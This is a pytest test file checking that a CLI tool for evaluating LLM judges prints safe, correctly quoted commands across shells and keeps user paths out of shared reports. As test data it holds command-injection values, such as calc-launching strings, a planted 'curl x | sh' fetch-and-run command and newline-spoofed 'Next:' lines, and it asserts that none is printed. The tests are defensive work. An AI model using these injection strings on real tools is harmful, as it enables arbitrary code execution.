"""Commands judgekeeper prints are safe on Windows and when read back.

- A kept command (result.json, report.html, the page) never uses POSIX quotes on Windows: a
  held-back value shows as NAME, with the value beside it as data.
- A held-back value is said on one line.
- The command in result.json is rebuilt from the saved flags, never shown as it is.
- After `python -P -m judgekeeper`, every later command keeps `-P`.
"""

from __future__ import annotations

import json
import os
import re
import subprocess
import sys
from html import escape
from pathlib import Path
from types import SimpleNamespace

import pytest

from judgekeeper import front, report_page, start, start_label, textio
from judgekeeper.cli import main
from judgekeeper.start_label import StartSession, Workspace
from tests.start_projects import promptfoo_project, split, unwrapped


@pytest.fixture
def windows(monkeypatch):
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(subprocess, "CREATE_NEW_PROCESS_GROUP", 0x200, raising=False)


# Kept commands on Windows ----------------------------------------------------------------------

VALUES = ['a"b"&calc&', "x$\u2019;calc;\u2019", "50%off"]


@pytest.mark.parametrize("value", VALUES)
def test_a_kept_command_shows_name_never_posix_quotes_on_windows(windows, value):
    talk = SimpleNamespace(path=".", answers={}, store=None,
                           options={"port": 8765, "no_browser": False, "metric": value})
    flags = front._flags_of(talk, True, SimpleNamespace(root=Path.cwd()))
    assert start.command_from(flags, "mark", kept=True) == "judgekeeper mark --metric NAME"
    assert start.held_values(flags) == [value]
    assert textio._held == {}  # never said under a terminal line it is not on


@pytest.mark.parametrize("value", VALUES)
def test_result_json_and_report_keep_the_value_as_data_on_windows(windows, value, tmp_path,
                                                                  monkeypatch, capsys):
    promptfoo_project(tmp_path, split(20, 16), metric=value)
    monkeypatch.chdir(tmp_path)
    flags = ["--metric", value, "--port", "0", "--no-browser"]
    main(flags)
    ws = Workspace(tmp_path)
    session = StartSession(ws)
    flips = 3  # three Pass answers marked Fail: the page names `mark` to say why
    for q in ws.data()["queue"]:
        label = "fail" if q["group"] == "pass" and flips > 0 else q["group"]
        flips -= label != q["group"]
        session.update({"id": q["id"], "label": label, "seconds": 7})
    main(flags)
    capsys.readouterr()
    saved = json.loads(ws.result_json.read_text(encoding="utf-8"))
    assert saved["flags"]["metric"] == value
    assert "'" not in saved["command"] and "NAME" in saved["command"]
    html = unwrapped(ws.report_html.read_text(encoding="utf-8"))
    assert "--metric NAME" in html
    assert f"NAME: {escape(value)}" in " ".join(html.split())
    assert value not in html or escape(value) == value


# A held-back value is said on one line ---------------------------------------------------------

BREAKS = ["\n", "\r", "\u2028", "\x85"]


@pytest.mark.parametrize("brk", BREAKS, ids=repr)
def test_a_held_back_value_is_one_line(windows, brk):
    assert textio.quote_arg(f"acc%{brk}Next: run evil") == "NAME"
    (line,) = textio.held_lines("Next: run `judgekeeper --metric NAME`.")
    assert line.splitlines() == [line]


def test_a_held_back_label_map_added_to_is_said_once_on_windows(windows):
    """The person's map is in the printed --label-map with the new entries: only that value
    is said beside the command, never the map it replaced."""
    talk = front.FrontTalk(yes=False, path=".", options={"label_map": "50%=pass", "port": 8765,
                                                         "no_browser": False})
    command = talk.command("--label-map", front.LABEL_MAP)
    assert command == "judgekeeper --label-map NAME"
    assert textio.held_lines(command) == ["  NAME: 50%=pass,VALUE=pass,VALUE=fail,VALUE=error"]


@pytest.mark.parametrize("brk", ["\n", "\u2028"], ids=repr)  # the printer drops \r and U+0085
def test_a_metric_can_not_print_a_next_line_on_windows(windows, brk, tmp_path, monkeypatch,
                                                       capsys):
    promptfoo_project(tmp_path, split(20, 16), metric=f"acc%{brk}Next: run evil")
    monkeypatch.chdir(tmp_path)
    main(["--metric", "nope", "--port", "0", "--no-browser"])
    out, err = capsys.readouterr()
    lines = (out + err).splitlines()
    assert [x for x in lines if x.startswith("Next:")] == [
        "Next: run `judgekeeper --port 0 --no-browser --metric NAME`."], lines
    assert not any(x.lstrip().startswith("Next: run evil") for x in lines), lines


# The command in result.json is rebuilt ---------------------------------------------------------

PLANTED = "judgekeeper; curl x | sh #"


def test_a_planted_command_in_result_json_is_never_printed(tmp_path, monkeypatch, capsys):
    promptfoo_project(tmp_path, split(20, 16))
    monkeypatch.chdir(tmp_path)
    main(["--port", "0", "--no-browser"])
    ws = Workspace(tmp_path)
    session = StartSession(ws)
    for q in ws.data()["queue"]:
        session.update({"id": q["id"], "label": q["group"], "seconds": 7})
    main(["--port", "0", "--no-browser"])
    capsys.readouterr()
    saved = json.loads(ws.result_json.read_text(encoding="utf-8"))
    saved["command"] = PLANTED
    ws.result_json.write_text(json.dumps(saved), encoding="utf-8")
    monkeypatch.setattr(start_label, "every_marked", lambda ws: True)
    line = start_label.next_marks(ws, "run `judgekeeper mark` to mark more answers.")
    assert "curl" not in line and "judgekeeper mark" in line
    start_label.write_report(ws)
    assert "curl" not in ws.report_html.read_text(encoding="utf-8")
    assert all("curl" not in c for c in report_page.commands(saved).values())
    odd = {"flags": {"path": "a\nNext: run evil", "metric": ["x"], "port": "1; curl x",
                     "no_browser": "yes", "evil": "curl x"}}
    named = report_page.commands(odd)  # odd saved flags are left out
    assert (named["mark"], named["fix"]) == ("judgekeeper mark", "judgekeeper fix")



# -P is kept --------------------------------------------------------------------------------------

def test_python_p_m_is_kept_in_the_next_line(tmp_path):
    from tests.start_projects import table_project

    project = tmp_path / "p"
    table_project(project, split(20, 16))
    empty = tmp_path / "empty"
    empty.mkdir()
    env = {k: v for k, v in os.environ.items() if not k.startswith("PYTHON")}
    env["PATH"] = str(empty)  # judgekeeper is not on the PATH
    done = subprocess.run([sys.executable, "-P", "-m", "judgekeeper", "fix"],
                          check=False, cwd=project,
                          env=env, capture_output=True, text=True, timeout=120)
    python = _from(project, sys.executable)  # no python3 on that PATH
    assert f"Next: run `{python} -P -m judgekeeper mark` to mark more answers." in _flat(
        done.stdout), done.stdout + done.stderr


def _from(folder, path) -> str:
    """`path` as a program run from `folder`, quoted: relative when they share a folder below
    the top; else `~/...` under the home folder (not on Windows); else as it is."""
    folder, path = os.path.realpath(folder), str(path)
    try:
        shared = os.path.commonpath([folder, path])
    except ValueError:  # another drive
        return textio.quote_arg(path)
    if os.path.dirname(shared) != shared:
        return textio.quote_arg(os.path.relpath(path, folder))
    home = os.path.realpath(os.path.expanduser("~"))
    if sys.platform != "win32" and path.startswith(home + os.sep):
        return "~/" + textio.quote_arg(path[len(home) + 1:])
    return textio.quote_arg(path)


def _flat(text: str) -> str:
    return " ".join(text.split())


def _not_on_path(project):
    empty = project.parent / "empty"
    empty.mkdir(exist_ok=True)
    env = {k: v for k, v in os.environ.items() if not k.startswith("PYTHON")}
    env["PATH"] = str(empty)
    return env


@pytest.mark.skipif(sys.platform == "win32", reason="a venv's scripts are .exe files there")
def test_a_venv_not_activated_says_its_program_as_typed(tmp_path):
    """`venv/bin/judgekeeper fix` with the venv not activated: the Next line names the program
    the same way, and it runs as printed."""
    from tests.start_projects import table_project

    script = os.path.join(os.path.dirname(sys.executable), "judgekeeper")
    if not os.path.isfile(script):
        pytest.skip("no judgekeeper script beside this Python")
    project = tmp_path / "p"
    table_project(project, split(20, 16))
    typed = os.path.relpath(script, project)  # as the person typed it
    env = _not_on_path(project)
    done = subprocess.run([typed, "fix"], check=False, cwd=project, env=env,
                          capture_output=True, text=True, timeout=120)
    assert f"Next: run `{typed} mark` to mark more answers." in _flat(done.stdout), (
        done.stdout + done.stderr)
    assert not typed.startswith("/")  # from here: no home folder in it
    again = subprocess.run([*typed.split(), "--version"], check=False, cwd=project, env=env,
                           capture_output=True, text=True, timeout=60)
    assert again.returncode == 0, again.stderr


@pytest.mark.parametrize("windows", [False, True])
def test_off_the_path_python_m_is_named_only_when_that_python_can_import_it(monkeypatch,
                                                                            tmp_path, windows):
    if sys.platform == "win32" and not windows:
        pytest.skip("a Windows path can't be faked into a POSIX one")
    monkeypatch.setattr(sys, "platform", "win32" if windows else "darwin")
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.chdir(tmp_path)
    program = os.path.join(os.path.abspath(os.sep), "opt", "tools", "bin", "judgekeeper")
    monkeypatch.setattr(sys, "argv", [program])  # typed in full
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: True)
    python = "py" if windows else "python3"
    assert textio.program("mark") == f"{python} -P -m judgekeeper mark"
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: False)
    assert textio.program("mark") == f"{program} mark"  # outside home: as it is, no quotes
    monkeypatch.setattr(sys, "argv", [os.path.join(os.path.dirname(program), "pytest")])
    assert textio.program("mark") == "judgekeeper mark"  # not judgekeeper's own: as before


def test_program_names_python_p_m_only_when_started_so(monkeypatch):
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setitem(sys.modules, "__main__",
                        SimpleNamespace(__spec__=SimpleNamespace(name="judgekeeper.__main__")))
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: True)
    assert textio.program("mark") == "python3 -P -m judgekeeper mark"
    monkeypatch.setattr(sys, "platform", "win32")
    assert textio.program("--stop") == "py -P -m judgekeeper --stop"
    monkeypatch.setattr("shutil.which", lambda name: "/usr/local/bin/judgekeeper")
    assert textio.program("mark") == "judgekeeper mark"


# A value that starts with "-" ------------------------------------------------------------------

DASHED = ["--yes", "-x", "--new", "-", "--metric=a b"]


@pytest.mark.parametrize("value", DASHED)
@pytest.mark.parametrize("name, flag", [x for x in start.REPEATED if x[0] != "tool"])
def test_a_value_starting_with_a_dash_is_kept_as_flag_equals_value(name, flag, value):
    import shlex

    from judgekeeper.cli import _front_parser, _parser

    flags = start.run_flags(**{name: value})
    command = start.command_from(flags, "mark", kept=True)
    assert f" {flag}=" in command, command
    for parse, argv in ((_parser().parse_args, shlex.split(command)[1:]),
                        (_front_parser().parse_args, shlex.split(command)[2:])):
        args = parse(argv)
        assert getattr(args, name) == value, (command, argv)
        assert args.yes is False and getattr(args, "new", False) is False


def test_a_plain_value_keeps_its_space():
    flags = start.run_flags(metric="faithful")
    assert start.command_from(flags, "mark", kept=True) == "judgekeeper mark --metric faithful"


# A held-back name in the "choose" line ---------------------------------------------------------

def test_a_held_back_metric_in_the_choose_line_is_said_as_data_on_windows(windows, monkeypatch,
                                                                         capsys, tmp_path):
    monkeypatch.setattr(start, "_interactive", lambda: False)
    talk = front.FrontTalk(yes=False, path=tmp_path, options={})
    evil = "a'&calc&'\""
    assert textio.held_back(evil)
    with pytest.raises(start.Stop):
        talk.choose("Several LLM-as-a-judge setups:", [evil, "plain"], "", flag="--metric",
                    values=[evil, "plain"], what="which LLM-as-a-judge to check")
    lines = capsys.readouterr().out.splitlines()
    said = " ".join(" ".join(lines).split())
    assert 'choose which LLM-as-a-judge to check (NAME, "plain")' in said, said
    assert "'a'&calc" not in said.replace(f"NAME: {evil}", "")
    assert f"  NAME: {evil}" in lines, lines


@pytest.mark.skipif(sys.platform == "win32", reason="Windows shells don't read ~")
def test_a_program_under_home_run_from_a_folder_outside_it_is_named_from_home(monkeypatch,
                                                                              tmp_path):
    """A project outside the home folder (here /tmp-like), the program inside it: `~/...`,
    never the home folder's own path (it holds the user name)."""
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setenv("HOME", "/Users/someone")
    monkeypatch.chdir(tmp_path)  # shares only the top folder with /Users/someone
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: False)
    monkeypatch.setattr(sys, "argv", ["/Users/someone/My Tools/venv/bin/judgekeeper"])
    assert textio.program("mark") == "~/'My Tools/venv/bin/judgekeeper' mark"
    monkeypatch.setattr(sys, "argv", ["/Users/someone/venv/bin/judgekeeper"])
    assert textio.program() == "~/venv/bin/judgekeeper"
    assert "someone" not in textio.program()


@pytest.mark.skipif(sys.platform == "win32", reason="faked: the temp folder is under C:\\Users there")
def test_on_windows_a_program_runs_as_printed_in_cmd_and_powershell(monkeypatch, tmp_path):
    """A program is unquoted and never %USERPROFILE% (PowerShell reads neither as cmd does):
    from here or as it is, the shorter; else its own python runs judgekeeper; only when no
    form runs in both, from here in double quotes (cmd's form)."""
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setenv("HOME", "/Users/someone")  # Path.home() on this (faked) Windows
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "platform", "win32")
    monkeypatch.setattr(textio, "imports_judgekeeper", lambda python: False)
    monkeypatch.setattr(sys, "argv", ["/Users/someone/venv/Scripts/judgekeeper.exe"])
    assert textio.program() == "/Users/someone/venv/Scripts/judgekeeper.exe"  # the shorter
    (tmp_path / "a").mkdir()
    monkeypatch.chdir(tmp_path / "a")
    monkeypatch.setattr(sys, "argv", [str(tmp_path / "venv" / "Scripts" / "judgekeeper.exe")])
    assert textio.program() == "../venv/Scripts/judgekeeper.exe"  # from here
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "argv", ["/Users/someone/My Tools/venv/Scripts/judgekeeper.exe"])
    monkeypatch.setattr(sys, "executable", "/Users/someone/py/python.exe")
    assert textio.program("mark") == "/Users/someone/py/python.exe -P -m judgekeeper mark"
    monkeypatch.setattr(sys, "executable", "/Users/someone/My Tools/venv/Scripts/python.exe")
    up = os.path.relpath("/Users/someone/My Tools/venv/Scripts/judgekeeper.exe",
                         os.path.realpath(tmp_path))
    assert textio.program("mark") == f'"{up}" mark'  # none runs in both: from here, quoted


@pytest.mark.skipif(sys.platform == "win32", reason="Windows shells don't read ~")
def test_a_path_typed_in_home_from_a_folder_outside_it_is_repeated_from_home(monkeypatch,
                                                                             tmp_path):
    """A Next: line repeats a whole path from here; sharing only the top folder, a path in
    the home folder is `~/...`, never `../../Users/<name>/...`."""
    monkeypatch.setenv("HOME", "/Users/someone")
    monkeypatch.chdir(tmp_path)
    assert textio.from_here("/Users/someone/labels.csv", labels=True) == "~/labels.csv"
    assert textio.runnable("/Users/someone/My Labels/l.csv", labels=True) == (
        "~/'My Labels/l.csv'")
    assert textio.shown_from_here("/Users/someone/My Labels/l.csv") == "~/My Labels/l.csv"
    inside = tmp_path / "data" / "l.csv"  # sharing more than the top: from here, as before
    assert textio.from_here(str(inside), labels=True) == "data/l.csv"
    assert textio.from_here("/opt/data/l.csv", labels=True) == "<file>"  # climbs to the top
    assert textio.shown_from_here("/opt/data/l.csv") == "l.csv"


@pytest.mark.skipif(sys.platform == "win32", reason="faked: the temp folder is under C:\\Users there")
def test_on_windows_a_path_in_home_is_repeated_from_here_and_named_from_userprofile(
        monkeypatch, tmp_path):
    """A command repeats it from here when the two share a folder in the home folder, else
    in full, double-quoted (PowerShell doesn't read %USERPROFILE%, and from here would climb
    to the top): never a stand-in for a file that is there. A line that only names it still
    says %USERPROFILE%."""
    monkeypatch.setenv("HOME", "/Users/someone")
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(sys, "platform", "win32")
    assert textio.runnable("/Users/someone/My Labels/l.csv", labels=True) == (
        '"/Users/someone/My Labels/l.csv"')
    assert textio.runnable("/Users/someone/labels.csv", labels=False) == (
        "/Users/someone/labels.csv")
    assert textio.shown_from_here("/Users/someone/My Labels/l.csv") == (
        "%USERPROFILE%\\My Labels\\l.csv")
    home = os.path.realpath(tmp_path)
    monkeypatch.setenv("HOME", home)
    (tmp_path / "proj").mkdir()
    monkeypatch.chdir(tmp_path / "proj")
    assert textio.runnable(os.path.join(home, "My Labels", "l.csv"), labels=True) == (
        '"../My Labels/l.csv"')


# report.html is a file people share: it names the program plainly ----------------------------

TYPED = "venv/bin/judgekeeper"  # a program typed as a path from here (textio.off_path)


def _measured(root, capsys) -> Workspace:
    """A table of 50 answers, 40 of them marked by import: a result, and answers to mark."""
    from tests.start_projects import answer, table_project
    from tests.test_labels_import import write_labels

    table_project(root, split(25, 25))
    write_labels(root / "mine.csv", [{"answer": answer(i), "label": "pass" if i < 25 else "fail"}
                                     for i in (*range(20), *range(25, 45))])
    main(["--labels", "mine.csv", "--no-browser", "--port", "0", "--yes"])
    capsys.readouterr()
    return Workspace(root)


def test_report_html_names_the_program_plainly_when_typed_as_a_path(tmp_path, monkeypatch,
                                                                     capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setattr(textio, "_typed", TYPED)
    ws = _measured(tmp_path, capsys)
    main(["--no-browser", "--port", "0"])
    out = "".join(capsys.readouterr())
    assert f"{TYPED} " in out  # the terminal: as typed, so it runs as printed here
    html = re.sub("<[^>]+>", "", ws.report_html.read_text(encoding="utf-8"))
    assert "venv/bin" not in html
    assert "judgekeeper mark --no-browser" in html


def test_report_html_names_uvx_when_uvx_started_it(tmp_path, monkeypatch, capsys):
    monkeypatch.chdir(tmp_path)
    monkeypatch.setattr(textio, "_typed", TYPED)
    monkeypatch.setattr(textio, "started_by_uvx", lambda: True)
    monkeypatch.setattr(textio, "extras_here", lambda: ())
    ws = _measured(tmp_path, capsys)
    html = re.sub("<[^>]+>", "", ws.report_html.read_text(encoding="utf-8"))
    assert "uvx judgekeeper mark" in html and "venv/bin" not in html


def test_report_html_after_worse_names_the_program_plainly(tmp_path, monkeypatch, capsys):
    from tests.test_check import HAIKU, LENIENT, _marked, _results
    from tests.test_check import run as check_run

    monkeypatch.chdir(tmp_path)
    monkeypatch.delenv("UV", raising=False)
    ws = _marked(tmp_path)
    start_label.store_result(ws, StartSession(ws))
    _results(tmp_path, LENIENT, model=HAIKU)
    monkeypatch.setattr(textio, "_typed", TYPED)
    code, out = check_run(capsys)
    assert code == 1, out
    assert f"{TYPED} check" in out
    html = ws.report_html.read_text(encoding="utf-8")
    assert "Go back to your old LLM-as-a-judge" in re.sub('<span class="term">(.*?)</span>',
                                                          r"\1", html)
    assert "venv/bin" not in html


# "go there, then run it": the program as typed from there ------------------------------------

def _off_the_path(monkeypatch, typed: str) -> None:
    """judgekeeper started as `typed`, a path from here, with no `judgekeeper` on the PATH."""
    monkeypatch.setattr(sys, "platform", "darwin")
    monkeypatch.setattr("shutil.which", lambda name: None)
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.setattr(sys, "argv", [typed])


@pytest.mark.skipif(sys.platform == "win32", reason="a venv's scripts are .exe files there")
def test_go_to_a_folder_names_the_program_as_typed_from_there(tmp_path, monkeypatch, capsys):
    from tests.start_projects import promptfoo_project, table_project

    (tmp_path / "venv" / "bin").mkdir(parents=True)
    (tmp_path / "venv" / "bin" / "judgekeeper").write_text("", encoding="utf-8")
    work = tmp_path / "work"
    table_project(work / "gym", split(20, 16))
    promptfoo_project(work / "dental", split(20, 16))
    monkeypatch.chdir(work)
    _off_the_path(monkeypatch, "../venv/bin/judgekeeper")
    assert textio.program() == "../venv/bin/judgekeeper"  # here, as typed
    code = main(["--no-browser", "--port", "0"])
    out = " ".join("".join(capsys.readouterr()).split())
    assert code == 3, out
    assert ("Next: go to one of those folders (`cd dental`), then run "
            "`../../venv/bin/judgekeeper` there.") in out, out


@pytest.mark.skipif(sys.platform == "win32", reason="a venv's scripts are .exe files there")
def test_a_line_for_another_project_names_a_program_that_runs_anywhere(tmp_path, monkeypatch):
    (tmp_path / "venv" / "bin").mkdir(parents=True)
    (tmp_path / "venv" / "bin" / "judgekeeper").write_text("", encoding="utf-8")
    (tmp_path / "work").mkdir()
    monkeypatch.chdir(tmp_path / "work")
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    _off_the_path(monkeypatch, "../venv/bin/judgekeeper")
    with textio.run_from(textio.ANYWHERE):
        assert textio.program("--stop") == "~/venv/bin/judgekeeper --stop"
    assert textio.program("--stop") == "../venv/bin/judgekeeper --stop"


# The result's commands are for the project folder -------------------------------------------

def test_the_result_commands_run_in_the_project_folder_after_a_run_from_above(tmp_path,
                                                                               monkeypatch,
                                                                               capsys):
    from tests.start_projects import answer, table_project
    from tests.test_labels_import import write_labels

    proj = tmp_path / "proj"
    table_project(proj, split(25, 25))
    write_labels(proj / "mine.csv", [{"answer": answer(i), "label": "pass" if i < 25 else "fail"}
                                     for i in (*range(20), *range(25, 45))])
    monkeypatch.chdir(tmp_path)
    main(["proj", "--labels", "proj/mine.csv", "--no-browser", "--port", "0", "--yes"])
    out = "".join(capsys.readouterr())
    assert "judgekeeper mark proj" in " ".join(out.split())  # the terminal: from here
    ws = Workspace(proj)
    r = json.loads(ws.result_json.read_text(encoding="utf-8"))
    commands = report_page.commands(r)
    assert commands["mark"].startswith("judgekeeper mark") and "proj" not in commands["mark"]
    for name in ("run", "check", "fix", "more"):
        assert "proj" not in commands[name], commands
    html = re.sub("<[^>]+>", "", ws.report_html.read_text(encoding="utf-8"))
    assert "judgekeeper mark proj" not in html and "judgekeeper mark --no-browser" in html


def test_on_windows_a_line_for_another_project_never_names_the_home_folder(tmp_path,
                                                                         monkeypatch):
    """Windows: a command never holds %USERPROFILE% or `~` (PowerShell reads neither): the
    full path, when no folder can be named to start from."""
    (tmp_path / "venv" / "bin").mkdir(parents=True)
    (tmp_path / "venv" / "bin" / "judgekeeper").write_text("", encoding="utf-8")
    (tmp_path / "work").mkdir()
    monkeypatch.chdir(tmp_path / "work")
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path)
    _off_the_path(monkeypatch, os.path.join(os.pardir, "venv", "bin", "judgekeeper"))
    monkeypatch.setattr(textio, "is_windows", lambda: True)
    with textio.run_from(textio.ANYWHERE):
        stop = textio.program("--stop")
    assert "%USERPROFILE%" not in stop and "~" not in stop, stop
    assert os.path.abspath(os.path.join(os.pardir, "venv", "bin", "judgekeeper")) in stop


# report.html written by check from another folder ---------------------------------------------

@pytest.mark.parametrize(("start_in", "given"), [("top", "project"), ("parent", "project"),
                                                 ("elsewhere", "project"),
                                                 ("project", "results")])
def test_report_html_from_check_in_another_folder_holds_no_path_from_there(start_in, given,
                                                                           tmp_path, monkeypatch,
                                                                           capsys):
    """`check <whole project path>` run from /, from the folder above or from another folder
    (or `check <whole results path>` in the project): the report it writes names no path from
    where it ran, no whole path and no program path. Its command runs in the project folder."""
    from tests.test_check import HAIKU, LENIENT, _marked, _results

    proj = tmp_path / "home" / "acme-bot"
    proj.mkdir(parents=True)
    elsewhere = tmp_path / "other"
    elsewhere.mkdir()
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path / "home")
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.chdir(proj)
    ws = _marked(proj)
    start_label.store_result(ws, StartSession(ws))
    _results(proj, LENIENT, model=HAIKU)
    monkeypatch.chdir({"top": Path(proj.anchor), "parent": proj.parent,
                       "elsewhere": elsewhere, "project": proj}[start_in])
    monkeypatch.setattr(textio, "_typed", str(tmp_path / "venv" / "bin" / "judgekeeper"))
    code = main(["check", str(proj if given == "project" else proj / "results.json")])
    assert code == 1, capsys.readouterr()  # Worse: report.html says what to run next
    capsys.readouterr()
    html = ws.report_html.read_text(encoding="utf-8")
    text = re.sub("<[^>]+>", "", html)
    kept = ws.result_json.read_text(encoding="utf-8")
    for whole in {str(tmp_path), os.path.realpath(tmp_path), str(Path.home()),
                  str(Path("~").expanduser())}:
        assert whole not in html and whole not in kept, whole
    assert "venv" not in html and "~/" not in text
    assert "venv" not in kept and "~/" not in kept and "../" not in kept
    assert "acme-bot/" not in text and not re.search(r"judgekeeper \w+ \S*acme-bot", text)
    assert "../" not in text and "other/" not in text
    command = "judgekeeper check" + ("" if given == "project" else " results.json")
    assert f"run {command} again." in " ".join(text.split())


@pytest.mark.parametrize("start_in", ["parent", "elsewhere"])
def test_result_json_names_the_program_plainly_after_a_run_from_another_folder(start_in, tmp_path,
                                                                             monkeypatch,
                                                                             capsys):
    """judgekeeper typed as a path and run on the project from another folder: result.json
    keeps its command as typed in the project folder, the program named plainly."""
    from tests.start_projects import answer, table_project
    from tests.test_labels_import import write_labels

    proj = tmp_path / "home" / "acme-bot"
    table_project(proj, split(25, 25))
    write_labels(proj / "mine.csv", [{"answer": answer(i), "label": "pass" if i < 25 else "fail"}
                                     for i in (*range(20), *range(25, 45))])
    elsewhere = tmp_path / "other"
    elsewhere.mkdir()
    monkeypatch.setattr("pathlib.Path.home", lambda: tmp_path / "home")
    monkeypatch.delenv("UV", raising=False)
    monkeypatch.chdir({"parent": proj.parent, "elsewhere": elsewhere}[start_in])
    monkeypatch.setattr(textio, "_typed", os.path.relpath(tmp_path / "venv" / "bin" /
                                                          "judgekeeper"))
    main([str(proj), "--labels", str(proj / "mine.csv"), "--no-browser", "--port", "0",
          "--yes"])
    capsys.readouterr()
    r = json.loads(Workspace(proj).result_json.read_text(encoding="utf-8"))
    assert r["command"] == "judgekeeper --port 0 --no-browser", r["command"]
    write_labels(proj / "more.csv", [{"answer": answer(i), "label": "pass" if i < 25 else "fail"}
                                     for i in (20, 21, 45, 46)])
    main([str(proj), "--labels", str(proj / "more.csv"), "--no-browser", "--port", "0", "--yes"])
    main(["fix", str(proj)])
    capsys.readouterr()
    copies = sorted((proj / ".judgekeeper" / "history").glob("result-*.json"))
    assert copies, "a second result moves the first to history/"
    for copy in copies:
        assert json.loads(copy.read_text(encoding="utf-8"))["command"].startswith(
            "judgekeeper "), copy.name
    for kept in sorted((proj / ".judgekeeper").rglob("*")):
        if kept.is_file():
            data = kept.read_text(encoding="utf-8", errors="replace")
            assert "venv" not in data and str(tmp_path) not in data, kept.name
